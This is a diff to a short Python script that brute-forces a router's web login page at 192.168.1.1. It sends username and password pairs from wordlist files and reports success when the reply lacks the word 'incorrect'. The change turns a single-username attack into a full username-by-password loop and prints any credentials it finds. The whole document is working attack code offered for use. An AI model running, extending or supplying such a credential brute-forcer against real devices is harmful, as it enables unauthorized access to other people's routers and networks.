@@ -1,24 +1,27 @@
 import requests
 import sys
 
-url = "http://192.168.1.1" # Check address.md for routers' default IP address.
+url = "http://192.168.1.1"  # Check address.md for routers' default IP address.
 
-expression = "incorrect"
+expression = b"incorrect"  # changed to bytes-like object.
 
 def brute(username, password):
-    data = { 'username': username, 'password': password }
+    data = {'username': username, 'password': password}
     r = requests.post(url, data=data)
+    #print("Server response: ", r.content)  # (optional) print server response
     if expression not in r.content:
         print("Brute Forcing...")
-        print("[+] Password found : ",password)
+        print("[+] Username: ", username)
+        print("[+] Password: ", password)
         sys.exit()
-    else:
-        print(r.content," ",password)
+
 
 def main():
-    words = [w.strip() for w in open("password.txt", "rb").readlines()]
-    for payload in words:
-        brute("Admin", payload) # if 'Admin' does not work, try another default username in username.txt.
+    usernames = [u.strip() for u in open("username.txt", "r").readlines()] # add username.txt usage 
+    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
+    for username in usernames:
+        for password in passwords:
+            brute(username, password)  
 
 if __name__ == '__main__':
     main()
